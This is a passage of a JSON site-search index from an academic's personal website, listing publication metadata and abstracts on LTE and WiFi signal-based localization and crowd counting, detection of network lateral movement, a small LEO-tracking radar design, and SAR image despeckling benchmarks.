RSSI-based, statistic vs deterministic matching rule). In particular, the paper proposes a novel CSI-based signal fingerprinting that uses as fingerprint not directly the vector of channel gains per subcarrier, but rather some features extracted from these vectors. This method would greatly reduce the memory requirement of the database as well as the computational complexity of the matching phase. Experimental results, shown for both indoor and outdoor environments, confirm the effectiveness of the proposed method and also provide interesting insights on the use of LTE signal fingerprinting based on CSI.","tags":["Localization","Indoor","Outdoor","Fingerprinting","Device-Based","LTE","Channel State Information"],"title":"LTE signal fingerprinting localization based on CSI","type":"publication"},{"authors":["Simone Di Domenico","Giovanni Pecoraro","Ernestina Cianca","Mauro De Sanctis"],"categories":null,"content":" ","date":1476662400,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1476662400,"objectID":"8f7c4918ec616463b74abea88fcc44cd","permalink":"https://www.peco602.com/publication/0020-trained-once-doppler-spectrum/","publishdate":"2016-10-17T00:00:00Z","relpermalink":"/publication/0020-trained-once-doppler-spectrum/","section":"publication","summary":"This paper presents a WiFi-based device-free crowd counting and occupancy estimation system that can be used in rooms/environments different from the ones in which the training process has been performed. Therefore, crowd counting is achieved without requiring another training phase in each new environment. The proposed approach analyzes the shape of the Doppler spectrum of the received signal which is correlated to the number of people moving in the monitored environment. Unlike a radar-like approach, the use of a reference signal is not required. Experimental results are presented for two different rooms/environments without any constraint on the movements of the volunteers.","tags":["Device-Free","Crowdcounting","Channel State Information"],"title":"Trained-once device-free crowd counting and occupancy estimation using WiFi: A Doppler spectrum based approach","type":"publication"},{"authors":["Alessandro Greco","Giovanni Pecoraro","Alberto Caponi","Giuseppe Bianchi"],"categories":null,"content":"","date":1464739200,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1464739200,"objectID":"09b257de08c4ad1e54b36aaa078d5275","permalink":"https://www.peco602.com/publication/0010-advanced-behavioral-lateral-movement/","publishdate":"2016-06-01T00:00:00Z","relpermalink":"/publication/0010-advanced-behavioral-lateral-movement/","section":"publication","summary":"The fast evolving nature and the growing complexity of modern offensive techniques used in Advanced Persistent Threats attacks call for innovative approaches for defense techniques. The ability of modern offensive operations to acquire a foothold and then expand an infection inside the victim’s local area network, usually referred to as lateral movement activity, is significantly critical. Not only a distributed monitoring infrastructure is necessary to overcome the lack of a single network point for detection (opposed to the traditional network perimeter defense relying on outbound network intrusion detection systems), but also new signatures appear necessary to model the stealthy and complex behavior of offensive lateral movement activities. In this paper we demonstrate how to effectively use eXtended Finite State Machine patterns to face a set of commonly used lateral movement techniques. With reference to real world lateral movement attacks (including those ones based on IP spoofing), we show how the relevant detection signatures can be gathered and formally modeled, also employing a widespread distributed security architecture. Numerical results on real world traces show the effectiveness of the proposed approach in avoiding false positives.","tags":["Cyber Security","Lateral Movement"],"title":"Advanced Widespread Behavioral Probes against Lateral Movements","type":"publication"},{"authors":["Giovanni Pecoraro","Ernestina Cianca","Gaetano Marino","Marina Ruggieri"],"categories":null,"content":" ","date":1457049600,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1457049600,"objectID":"041df45a9d00dcb2c07b320e18b30658","permalink":"https://www.peco602.com/publication/0030-preliminary-design-radar-leo/","publishdate":"2016-03-04T00:00:00Z","relpermalink":"/publication/0030-preliminary-design-radar-leo/","section":"publication","summary":"The near Earth environment has radically changed since the first launch of Sputnik in 1957. So far, the number of uncontrolled artificial objects orbiting around the Earth has incredibly increased and the need of protecting space systems has become almost common to all spacecraft operators. Even though they are currently supported by the large U.S. Space Surveillance Network, most of them have noticed the necessity of creating their own space surveillance sensors. This paper presents a preliminary design of a small and easy to implement radar able to track LEO objects and provide orbits that are more accurate than Two-Line Element (TLE) orbits available online, which do not allow to perform a safe collision avoidance analysis. The adopted configuration is a monostatic pulsed radar with a maximum unambiguous range of 3000 km, a range resolution and angular resolutions of 20 m and 0.01°, respectively. According to the theoretical assessment, the proposed radar is able to detect targets with a Radar Cross Section (RCS) of at least 1 sq. m., which means circular targets with a minimum radius of 50 cm, with a detection probability of 0.9 and a false alarm probability of 0.1. To assess the radar performance, it has been developed CASSIM (Collision Avoidance System SIMulator), which models the system at all stages, from the targets to the signal processing techniques, going through the synthesis of the transmitted and received signals. The simulations have been conducted considering a scenario described in a Collision Data Message (CDM) sent by the U.S. Space Surveillance Network. The simulations have involved the less accurate TLE orbit as radar input and the CDM State Vector orbits as reference to model the simulated target. Results have shown that the radar orbit is comparable to the accurate CDM orbit and that the closest approach distance is very similar to the one indicated in the message (less than 30 m error on all components). The analysis presented in this paper shows the feasibility of this small and simple radar able to get more accurate orbits than TLEs. Moreover, it proved that a collision avoidance analysis based on the radar orbit can be equivalent and could be adequately integrated to the use of the U.S. Space Surveillance Network data.","tags":["Space","RADAR","LEO"],"title":"Preliminary design of a small tracking RADAR for LEO space objects","type":"publication"},{"authors":["Gerardo Di Martino","Giovanni Pecoraro","Giovanni Poggi","Daniele Riccio","Luisa Verdoliva"],"categories":null,"content":" ","date":1378684800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1378684800,"objectID":"24bf656756a8f8f1be1286f834228515","permalink":"https://www.peco602.com/publication/0000-extracting-compact-sar-despeckling/","publishdate":"2013-09-09T00:00:00Z","relpermalink":"/publication/0000-extracting-compact-sar-despeckling/","section":"publication","summary":"Image databases and benchmarks are precious tools to assess the quality of competing algorithms and to fine tune their parameters. In some cases, however, quality cannot be captured by a single measure, and several of them, providing typically contrasting indications, must be computed and analyzed. This is certainly the case for the SAR despeckling field, also because of the lack of clean reference images, which forces one to compute the measures of interest on simple canonical scenes. We present here the first results of an ongoing work aimed at selecting a suitable combination of benchmark measures to assess competing SAR despeckling techniques and rank them. The full validation of the proposed methodology will require the involvement of a reasonable number of expert photo-interpreters for a large-scale experimental campaign. Here, we present only a sample experiment to provide some insight about the approach.","tags":["Image Processing","SAR","Despeckling"],"title":"Extracting compact information from image benchmarking tools: the SAR despeckling case","type":"publication"}]